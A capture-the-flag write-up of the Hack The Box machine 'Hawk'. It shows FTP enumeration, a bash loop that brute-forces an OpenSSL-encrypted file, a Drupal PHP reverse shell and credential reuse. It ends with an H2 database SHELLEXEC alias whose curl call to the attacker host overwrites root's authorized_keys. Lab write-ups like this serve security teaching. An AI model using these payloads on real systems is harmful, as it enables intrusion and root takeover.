---
layout: single
title: Hawk - Hack The Box
date: 2018-12-01
classes: wide
header:
  teaser: /assets/images/htb-writeup-hawk/hawk.png
categories:
  - hackthebox
  - infosec
tags:
  - hackthebox
  - drupal  
---

## Linux / 10.10.10.102

![](/assets/images/htb-writeup-hawk/hawk.png)

This blog post is a quick writeup of Hawk from Hack the Box.

### Summary
------------------
- The server is running an FTP server, a Drupal website and an H2 database (which is not accessible remotely)
- There is an OpenSSL encrypted file on the publicly accessible FTP server
- We can bruteforce the key using a bash script and the openssl command
- The file contains the password for the Drupal admin account
- Once we are logged in to Drupal, we can create a PHP file that creates a reverse shell
- The shell gets us `www-data` and we can find the connection password in the Drupal configuration file
- We can log in as user `daniel` with the password we found
- The normal `/bin/bash` shell for user `daniel` has been replaced by `python`, which we can escape using `pty.spawn`
- Looking at the running processes, we find that the H2 database is running as `root`
- We can access the web interface by creating an SSH reverse tunnel back to our Kali machine
- The `sa` username is using the default empty password but we can log in by changing the URL to anything other than the default string
- Once logged in, we can execute commands as root using H2 SQL commands

### Tools/Blogs

- [https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html)

### Detailed steps
------------------

#### Nmap

Services running:

- FTP
- SSH
- Apache
- 5435 (?)
- H2 database (Web & TCP interface)

```
root@violentunicorn:~/hackthebox/Machines/Hawk# nmap -p- 10.10.10.102
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-14 19:26 EDT
Nmap scan report for hawk.htb (10.10.10.102)
Host is up (0.017s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
5435/tcp open  sceanics
8082/tcp open  blackice-alerts
9092/tcp open  XmlIpcRegSvc

Nmap done: 1 IP address (1 host up) scanned in 10.50 seconds
```

#### Services enumeration

Drupal is running on Port 80.

H2's database is not accessible on the HTTP port:

```
H2 Console

Sorry, remote connections ('webAllowOthers') are disabled on this server. 
```

H2's database is not accessible on the TCP port:

```
root@violentunicorn:~/Hawk# telnet 10.10.10.102 9092
Trying 10.10.10.102...
Connected to 10.10.10.102.
Escape character is '^]'.
90117FRemote connections to this server are not allowed, see -tcpAllowOthers��`�org.h2.jdbc.JdbcSQLException: Remote connections to this server are not allowed, see -tcpAllowOthers [90117-196]
  at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)
  at org.h2.message.DbException.get(DbException.java:179)
  at org.h2.message.DbException.get(DbException.java:155)
  at org.h2.message.DbException.get(DbException.java:144)
  at org.h2.server.TcpServerThread.run(TcpServerThread.java:82)
  at java.base/java.lang.Thread.run(Thread.java:844)
Connection closed by foreign host.
```

#### FTP recon & credentials file

Anonymous access is allowed on the server and there's a single file we can download.

```
root@violentunicorn:~/hackthebox/Machines/Hawk# ftp 10.10.10.102
Connected to 10.10.10.102.
220 (vsFTPd 3.0.3)
Name (10.10.10.102:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages
226 Directory send OK.

ftp> cd messages
250 Directory successfully changed.

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 16 22:14 ..
-rw-r--r--    1 ftp      ftp           240 Jun 16 22:21 .drupal.txt.enc
226 Directory send OK.

ftp> get .drupal.txt.enc
local: .drupal.txt.enc remote: .drupal.txt.enc
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).
226 Transfer complete.
240 bytes received in 0.00 secs (3.4679 MB/s)
```

The file contains a base64 encoded OpenSSL encrypted file

```
root@violentunicorn:~/hackthebox/Machines/Hawk# cat drupal.txt.enc 
U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb
CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz
QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy
t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=

root@violentunicorn:~/hackthebox/Machines/Hawk# base64 -d drupal.txt.enc > drupal-decoded.txt.enc 
root@violentunicorn:~/hackthebox/Machines/Hawk# file drupal-decoded.txt.enc
drupal-decoded.txt.enc: openssl enc'd data with salted password
```

To brute-force the file, I've tried using [bruteforce-salted-openssl](https://github.com/glv2/bruteforce-salted-openssl) but that tools is shit so I made my own script that does the same thing.

```sh
for pwd in $(cat /root/SecLists/Passwords/rockyou-75.txt)
  do openssl enc -aes-256-cbc -d -a -in drupal.txt.enc -out file.txt -k $pwd
  if [ $? -eq 0 ]
  then
    exit 1
  fi
done
```

The file contains a password:

```
root@violentunicorn:~/hackthebox/Machines/Hawk# cat file.txt 
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department
```

#### Drupal

So first we'll log on to Drupal with:
 - Username: `admin`
 - Password: `PencilKeyboardScanner123`

![Drupal login](/assets/images/htb-writeup-hawk/drupal1.png)

Next we need to enable `PHP filters` so we can embed PHP in pages.

![PHP filter](/assets/images/htb-writeup-hawk/drupal2.png)

Then we'll create a PHP page with a simple reverse shell.

![PHP reverse shell](/assets/images/htb-writeup-hawk/drupal3.png)

```
root@violentunicorn:~# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.102] 53700
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /home
$ ls
daniel
$ cd daniel
$ ls
user.txt
$ cat user.txt
d5111d<redacted>
```

We can find that there is another user: `daniel`

```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
tomcat:x:1001:46::/opt/tomat/temp:/sbin/nologin
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
daniel:x:1002:1005::/home/daniel:/usr/bin/python3
ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
Debian-snmp:x:113:116::/var/lib/snmp:/bin/false
```

#### Getting access to user daniel

In `/var/www/html/sites/default/settings.php` we find some credentials:

```
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupal',
      'password' => 'drupal4hawk',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

Password: `drupal4hawk`

We can log in as user daniel with this password:

```
root@violentunicorn:~# ssh daniel@10.10.10.102
daniel@10.10.10.102's password: 

Last login: Sun Jul  1 13:46:16 2018 from dead:beef:2::1004
Python 3.6.5 (default, Apr  1 2018, 05:46:30) 
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 
```

We can escape this python interactive shell with:

```
>>> import pty
>>> pty.spawn("/bin/bash")
daniel@hawk:~$ id
uid=1002(daniel) gid=1005(daniel) groups=1005(daniel)
```

#### Privesc using H2 database

To access the H2 database remotely, we'll do an SSH reverse tunnel:

```
daniel@hawk:~$ ssh -R 8082:localhost:8082 root@10.10.14.23
The authenticity of host '10.10.14.23 (10.10.14.23)' can't be established.
ECDSA key fingerprint is SHA256:F1UaVc5s2w2++Hm8MXsITptkhljyxkLiczC12e3U2nA.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.14.23' (ECDSA) to the list of known hosts.
root@10.10.14.23's password: 
Linux violentunicorn 4.15.0-kali3-amd64 #1 SMP Debian 4.15.17-1kali1 (2018-04-25) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jul 14 18:49:44 2018 from 10.10.10.102
```

We can then access the login page.

![H2 login](/assets/images/htb-writeup-hawk/h2login.png)

We have access to the preferences and we can enable remote access.

![H2 preferences](/assets/images/htb-writeup-hawk/h2prefs.png)

We can't log in with the default URL because the relative path is causing problems.

![H2 login failed](/assets/images/htb-writeup-hawk/h2login_failed.png)

![H2 URL](/assets/images/htb-writeup-hawk/h2url1.png)

If we change the URL to something else we can write to, we are able to log in.

![H2 URL](/assets/images/htb-writeup-hawk/h2url2.png)

![H2 URL](/assets/images/htb-writeup-hawk/h2sql1.png)

Next, we'll use a shellexec() command to gain RCE on the server:

![H2 URL](/assets/images/htb-writeup-hawk/h2sql2.png)

![H2 URL](/assets/images/htb-writeup-hawk/h2sql3.png)

In this case we are dropping our SSH public key in the root `authorized_keys` file:

```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;

CALL SHELLEXEC('curl 10.10.14.23/id_rsa.pub -o /root/.ssh/authorized_keys')
```

We can then log in as root and grab the root flag:

```
root@violentunicorn:~/.ssh# ssh root@10.10.10.102
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul 15 00:00:21 UTC 2018

  System load:  0.03              Processes:            113
  Usage of /:   54.1% of 9.78GB   Users logged in:      1
  Memory usage: 57%               IP address for ens33: 10.10.10.102
  Swap usage:   0%

 * Meltdown, Spectre and Ubuntu: What are the attack vectors,
   how the fixes work, and everything else you need to know
   - https://ubu.one/u2Know

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

55 packages can be updated.
3 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Jul 14 21:09:40 2018
root@hawk:~# cat root.txt
54f3e8<redacted>
```